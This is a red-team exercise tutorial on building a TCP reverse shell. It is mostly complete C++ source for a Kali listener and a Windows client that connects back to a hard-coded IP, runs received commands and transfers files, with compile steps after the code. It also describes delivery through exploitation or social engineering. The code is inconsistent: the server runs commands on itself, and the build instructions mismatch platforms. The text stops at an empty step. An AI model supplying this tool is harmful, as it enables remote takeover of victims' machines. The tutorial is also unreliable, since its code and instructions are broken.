# Write A TCP Reverse-Shell As A Windows Executable
Reverse shells are a common malware tool used by cyber adversaries. In this exercise, you'll learn to write a key offensive security tool for Red Teaming and penetration testing. A TCP reverse shell establishes a connection via TCP, allowing attackers to exploit vulnerabilities and execute commands on the target machine to gain control

## References
- [Reverse Connection](https://en.wikipedia.org/wiki/Reverse_connection) by Wikipedia
- [Simple C++ reverse shell for windows](https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html) by cocomelonc

## Tasks
- Write a custom program to establish a reverse shell via TCP from a target machine to a controller machine, with the capability to execute commands, upload and download files. The reverse shell program has two components - server and client
- Setup 1 VM (Kali Linux) as controller machine that runs the server component
- Setup 1 VM (Windows 10) to operate as target that runs the client component
- Research what reverse shells are and how they work
  - What is a reverse shell?
  - How are reverse shells deployed on a target?
  - What capabilities does a reverse shell provide?
  - How can a reverse shell be created?
  - What software utilities can be incorporated into a reverse shell's functionality?
  - How do reverse shells evade detection?
- Ensure that the reverse shell has the following capabilities
  - The client connects to the server via TCP
  - On the server, the user can execute commands on the target
  - On the server, the user can upload files to the target
  - On the server, the user can download files from the target
- Requirements of the reverse shell
  - The reverse shell does not rely on third-party functionality (netcat, HTTP, meterpreter)
  - The reverse shell must implement command line formats similar to those used by Meterpreter (e.g., shell, download, upload)
  - The reverse shell must accommodate file uploads and downloads of any size
- Execute the reverse shell
  - Execute all components of your reverse shell
  - From the server, execute commands on the target
  - From the server, upload files to the target
  - From the server, download files from the target


## Benchmarks
- Validate that the target machine connects back to the server via the TCP reverse shell
- Validate that you can execute commands on the server and view information about the target
- Validate that you can upload files to the target from the server
- Validate that you can download files from the target to the server


## Practical Approach
#### What is a Reverse Shell?
A reverse shell is a remote access tool where the target machine (client) initiates a connection back to the attacker's machine (server). This bypasses firewalls that block incoming connections

#### How are Reverse Shells Deployed?
- Exploitation: Using a vulnerability to execute the reverse shell client on the target
- Social Engineering: Convincing the user to execute the payload

#### What Capabilities Does a Reverse Shell Provide?
- Execute commands remotely
- Upload and download files
- Maintain persistence (optional)

#### How Can a Reverse Shell Be Created?
Reverse shells are created using programming languages like Python, C, C++, or Assembly, and involve socket programming for network communication

1. Save and compile the following C++ code as the server component (listener) with the name `tcprevshell_server.exe`
   ```
    #include <iostream>
    #include <fstream>
    #include <string>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <unistd.h>
    
    #define PORT 4444
    #define BUFFER_SIZE 1024
    
    // Function to upload a file from the client
    void upload_file(int client_socket) {
        std::ofstream file("uploaded_file", std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "Failed to open file for writing." << std::endl;
            return;
        }
    
        char buffer[BUFFER_SIZE];
        int bytes_received;
        while ((bytes_received = recv(client_socket, buffer, sizeof(buffer), 0)) > 0) {
            file.write(buffer, bytes_received);
        }
        file.close();
        std::cout << "File uploaded successfully." << std::endl;
    }
    
    // Function to download a file to the client
    void download_file(int client_socket, const std::string& file_path) {
        std::ifstream file(file_path, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "Failed to open file for reading." << std::endl;
            return;
        }
    
        char buffer[BUFFER_SIZE];
        while (file.read(buffer, sizeof(buffer))) {
            send(client_socket, buffer, file.gcount(), 0);
        }
        if (file.gcount() > 0) {
            send(client_socket, buffer, file.gcount(), 0);
        }
        file.close();
        std::cout << "File sent successfully." << std::endl;
    }
    
    // Function to execute shell commands on the Kali Linux server
    void execute_command(int client_socket, const std::string& command) {
        FILE* fp = popen(command.c_str(), "r");
        if (fp) {
            char result[BUFFER_SIZE];
            while (fgets(result, sizeof(result), fp)) {
                send(client_socket, result, strlen(result), 0);
            }
            pclose(fp);
        } else {
            std::string error_message = "Failed to execute command.\n";
            send(client_socket, error_message.c_str(), error_message.size(), 0);
        }
    }
    
    int main() {
        int server_socket, client_socket;
        sockaddr_in server_addr, client_addr;
        socklen_t addr_len = sizeof(client_addr);
        char buffer[BUFFER_SIZE];
    
        // Create a socket
        server_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (server_socket == -1) {
            std::cerr << "Failed to create server socket." << std::endl;
            return 1;
        }
    
        // Set up the server address structure
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(PORT);
        server_addr.sin_addr.s_addr = INADDR_ANY;
    
        // Bind the socket
        if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            std::cerr << "Bind failed." << std::endl;
            close(server_socket);
            return 1;
        }
    
        // Listen for incoming connections
        listen(server_socket, 1);
        std::cout << "Server listening on port " << PORT << "..." << std::endl;
    
        // Accept a connection from a client (victim machine)
        client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &addr_len);
        if (client_socket < 0) {
            std::cerr << "Failed to accept client connection." << std::endl;
            close(server_socket);
            return 1;
        }
        std::cout << "Client connected!" << std::endl;
    
        // Handle communication with the client
        while (true) {
            std::cout << "Enter command: ";
            std::string command;
            std::getline(std::cin, command);
    
            // Send command to the client
            send(client_socket, command.c_str(), command.length(), 0);
    
            // Handle 'upload' or 'download'
            if (command.find("upload") == 0) {
                upload_file(client_socket);
            } else if (command.find("download") == 0) {
                std::string file_path = command.substr(9);
                download_file(client_socket, file_path);
            } else if (command == "exit") {
                break;
            } else {
                execute_command(client_socket, command);
            }
        }
    
        // Clean up and close the socket
        close(client_socket);
        close(server_socket);
        return 0;
    }
   ```
2. Save and compile the following C++ code as the client component (executor) with the name `tcprevshell_client.exe`
   ```
    #include <iostream>
    #include <fstream>
    #include <string>
    #include <winsock2.h>
    
    #pragma comment(lib, "ws2_32.lib")  // Link with the Winsock library
    
    #define SERVER_IP "192.168.1.2"  // Replace with your Kali Linux IP address
    #define PORT 4444
    #define BUFFER_SIZE 1024
    
    // Function to upload a file to the server
    void upload_file(SOCKET client_socket, const std::string& file_path) {
        std::ifstream file(file_path, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "Failed to open file for uploading." << std::endl;
            return;
        }
    
        char buffer[BUFFER_SIZE];
        while (file.read(buffer, sizeof(buffer))) {
            send(client_socket, buffer, file.gcount(), 0);
        }
        if (file.gcount() > 0) {
            send(client_socket, buffer, file.gcount(), 0);
        }
        file.close();
        std::cout << "File uploaded successfully." << std::endl;
    }
    
    // Function to download a file from the server
    void download_file(SOCKET client_socket, const std::string& file_path) {
        std::ofstream file(file_path, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "Failed to open file for downloading." << std::endl;
            return;
        }
    
        char buffer[BUFFER_SIZE];
        int bytes_received;
        while ((bytes_received = recv(client_socket, buffer, sizeof(buffer), 0)) > 0) {
            file.write(buffer, bytes_received);
        }
        file.close();
        std::cout << "File downloaded successfully." << std::endl;
    }
    
    // Function to execute commands on the client system and send the result back
    void execute_command(SOCKET client_socket, const std::string& command) {
        FILE* fp = _popen(command.c_str(), "r");
        if (fp) {
            char result[BUFFER_SIZE];
            while (fgets(result, sizeof(result), fp)) {
                send(client_socket, result, strlen(result), 0);
            }
            _pclose(fp);
        } else {
            std::string error_message = "Failed to execute command.\n";
            send(client_socket, error_message.c_str(), error_message.size(), 0);
        }
    }
    
    int main() {
        // Initialize Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "Winsock initialization failed." << std::endl;
            return 1;
        }
    
        SOCKET client_socket;
        sockaddr_in server_addr;
        char buffer[BUFFER_SIZE];
    
        // Create a socket
        client_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (client_socket == INVALID_SOCKET) {
            std::cerr << "Socket creation failed." << std::endl;
            WSACleanup();
            return 1;
        }
    
        // Set up the server address structure
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(PORT);
        server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
    
        // Connect to the server
        if (connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            std::cerr << "Connection to server failed." << std::endl;
            closesocket(client_socket);
            WSACleanup();
            return 1;
        }
    
        std::cout << "Connected to the server!" << std::endl;
    
        while (true) {
            // Receive command from server
            int bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
            if (bytes_received > 0) {
                buffer[bytes_received] = '\0';  // Null-terminate the received string
                std::string command(buffer);
    
                // Handle 'exit' command
                if (command == "exit") {
                    break;
                }
                // Handle 'upload' command
                else if (command.find("upload ") == 0) {
                    std::string file_path = command.substr(7);  // Extract file path after 'upload '
                    upload_file(client_socket, file_path);
                }
                // Handle 'download' command
                else if (command.find("download ") == 0) {
                    std::string file_path = command.substr(9);  // Extract file path after 'download '
                    download_file(client_socket, file_path);
                }
                // Execute shell commands
                else {
                    execute_command(client_socket, command);
                }
            }
        }
    
        // Clean up and close the socket
        closesocket(client_socket);
        WSACleanup();
        return 0;
    }
   ```
3. To compile the C++ code on Windows, MinGW can be used. It can be downloaded from [here](https://www.mingw-w64.org/). Install it and include the `g++` component. Add the `bin` directory of MinGW (e.g. `C:/MinGW/bin`) to your system's PATH environment variable. Open the command prompt and navigate to the folder where the `.cpp` files are saved. Use each of the following commands to compile:
   ```
   g++ tcprevshell_server.cpp -o tcprevshell_server -lws2_32
   g++ tcprevshell_client.cpp -o tcprevshell_client -lws2_32
   ```
   To compile the C++ code on Kali Linux, install GCC using
   ```
   sudo apt update && sudo apt install g++
   sudo apt install libssl-dev
   ```
   Then compile using g++
   ```
   g++ -o tcprevshell_client tcprevshell_client.cpp -lws2_32
   g++ -o tcprevshell_server tcprevshell_server.cpp
   ```
   Ensure the output files have execution permissions with
   ```
   chmod +x tcprevshell_server tcprevshell_client
   ```
4. 
